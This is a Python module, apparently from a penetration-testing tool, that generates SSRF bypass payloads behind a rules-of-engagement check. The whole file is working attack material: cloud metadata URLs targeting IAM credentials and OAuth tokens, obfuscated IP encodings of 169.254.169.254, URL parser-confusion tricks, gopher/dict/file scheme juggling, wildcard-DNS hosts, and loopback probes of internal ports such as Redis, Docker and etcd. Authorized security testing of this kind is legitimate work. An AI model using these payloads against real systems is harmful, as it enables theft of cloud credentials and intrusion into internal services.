"""SSRF bypass matrix.

Pure string generation for IP representations, URL parser confusion,
scheme juggling, and DNS wildcards. Every URL produced here is meant to be
sent through engine.http (ROE-gated) by the caller — this module never
touches the network itself.
"""
from __future__ import annotations

from urllib.parse import urlparse, urlunparse


CLOUD_METADATA_HOSTS = (
    "169.254.169.254",
    "metadata.google.internal",
    "100.100.100.200",
    "fd00:ec2::254",
)


CLOUD_METADATA_URLS = [
    ("aws_iam",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws_root", "http://169.254.169.254/latest/meta-data/"),
    ("aws_userdata", "http://169.254.169.254/latest/user-data"),
    ("aws_decimal", "http://2852039166/latest/meta-data/"),
    ("gcp_token",
     "http://metadata.google.internal/computeMetadata/v1/"
     "instance/service-accounts/default/token"),
    ("azure_instance",
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("azure_token",
     "http://169.254.169.254/metadata/identity/oauth2/token"
     "?api-version=2018-02-01&resource=https://management.azure.com/"),
    ("digitalocean", "http://169.254.169.254/metadata/v1.json"),
    ("alibaba", "http://100.100.100.200/latest/meta-data/"),
    ("oracle", "http://169.254.169.254/opc/v1/instance/"),
    ("oracle_identity", "http://169.254.169.254/opc/v2/identity/"),
]


INTERNAL_PORTS = [
    8080, 8443, 8000, 8888, 5000,
    6379, 9200, 3306, 5432, 27017,
    8500, 2375, 2379, 6443,
]


def ip_representations(ip_str):
    """Return alternate wire-level representations of an IPv4 dotted IP."""
    if not ip_str:
        return []
    parts = ip_str.split(".")
    if len(parts) != 4 or not all(p.isdigit() for p in parts):
        return [ip_str]
    try:
        a, b, c, d = (int(p) for p in parts)
    except ValueError:
        return [ip_str]
    if any(x < 0 or x > 255 for x in (a, b, c, d)):
        return [ip_str]
    dec = (a << 24) | (b << 16) | (c << 8) | d
    return [
        ip_str,
        str(dec),
        "0x%x" % dec,
        "0x%08x" % dec,
        ".".join(("0" + oct(x)[2:])
                  if oct(x)[2:] != str(x) else str(x)
                  for x in (a, b, c, d)),
        "0%o" % dec,
        "%d.%d" % (a, (b << 16) | (c << 8) | d),
        "%d.%d.%d" % (a, b, (c << 8) | d),
        "%d.%d.%d.%d" % (a, b, c, d),
        "0.0.0.0",
        "[::1]",
        "[::ffff:%s]" % ip_str,
    ]


def parser_confusion(target_url, override_host="target.example"):
    """Return URL forms different parsers interpret differently."""
    parsed = urlparse(target_url)
    host = parsed.hostname or ""
    if not host:
        return [target_url]
    port = parsed.port
    port_s = ":%d" % port if port else ""
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    return [
        target_url,
        "%s://%s@%s%s%s" % (parsed.scheme, override_host, host, port_s, path),
        "%s://%s@%s%s%s" % (parsed.scheme, host, override_host, port_s, path),
        "%s://%s\\@%s%s%s" % (parsed.scheme, override_host, host, port_s, path),
        "//%s%s%s" % (host, port_s, path),
        "%s:%s%s" % (parsed.scheme, host, port_s),
        "%s:/%s%s%s" % (parsed.scheme, host, port_s, path),
    ]


def scheme_juggling(target_url):
    """Return the same host reached via alternate schemes."""
    parsed = urlparse(target_url)
    host = parsed.hostname or ""
    port = parsed.port
    port_s = ":%d" % port if port else ""
    path = parsed.path or "/"
    return [
        "gopher://%s%s/_GET %s" % (host, port_s, path),
        "dict://%s%s/" % (host, port_s),
        "file://%s" % path,
        "ftp://%s%s/" % (host, port_s),
        "jar://%s%s%s" % (host, port_s, path),
        "netdoc://%s%s/" % (host, port_s),
        "tftp://%s%s/" % (host, port_s),
    ]


def dns_wildcards(target_host):
    """Hostnames that wildcard-resolve to the host in the name."""
    if not target_host:
        return []
    encoded = target_host.replace(".", "-")
    return [
        "%s.nip.io" % encoded,
        "%s.sslip.io" % encoded,
        "%s.xip.io" % encoded,
        "localtest.me",
        "127.0.0.1.nip.io",
    ]


def bypass_variants_of_url(url):
    """Return URL variants: IP representations plus parser-confusion forms."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return [url]
    port = parsed.port
    port_s = ":%d" % port if port else ""
    out = []
    for ip_repr in ip_representations(host):
        new_netloc = ip_repr + port_s
        new_parsed = parsed._replace(netloc=new_netloc)
        out.append(urlunparse(new_parsed))
    for variant in parser_confusion(url):
        if variant != url and variant not in out:
            out.append(variant)
    return out


def roe_allows_url(guard, url, method="GET"):
    if guard is None:
        return True
    try:
        guard.check_url(url, method)
        return True
    except Exception:
        return False


def metadata_urls_allowed(guard):
    """Return metadata URLs whose target host is allowed by ROE."""
    out = []
    for label, url in CLOUD_METADATA_URLS:
        if roe_allows_url(guard, url):
            out.append((label, url))
    return out


def metadata_bypasses_allowed(guard):
    """Return metadata bypass variants that also pass ROE."""
    out = []
    for label, url in CLOUD_METADATA_URLS:
        if not roe_allows_url(guard, url):
            continue
        for v in bypass_variants_of_url(url):
            if v == url:
                continue
            if roe_allows_url(guard, v):
                out.append(("%s_var" % label, v))
    return out


def internal_port_bypasses(ports=None, path="/"):
    """Return (label, url) pairs probing internal loopback ports."""
    out = []
    for port in (ports or INTERNAL_PORTS):
        for ip in ip_representations("127.0.0.1")[:3]:
            label = "port_%d_%s" % (
                port, ip.replace(".", "_").replace(":", "_")
                          .replace("[", "").replace("]", ""))
            out.append((label, "http://%s:%d%s" % (ip, port, path)))
    return out
